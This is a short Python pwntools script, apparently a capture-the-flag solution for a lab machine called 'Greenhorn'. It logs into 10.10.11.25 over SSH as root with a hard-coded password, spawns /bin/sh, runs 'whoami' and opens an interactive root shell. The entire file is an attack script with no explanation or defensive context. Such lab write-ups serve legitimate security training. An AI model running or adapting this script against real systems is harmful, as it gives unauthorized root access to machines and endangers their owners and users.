import requests
import socket
from pwn import *
import threading
import os
import time
import subprocess

print("\n[\033[1;32m+\033[1;37m] Greenhorn- Ninhpn1337\n")


request = ssh(host="10.10.11.25", user="root", password="sidefromsidetheothersidesidefromsidetheotherside")
shell = request.process("/bin/sh")
shell.sendline(b"whoami")
time.sleep(0.5)
shell.interactive()
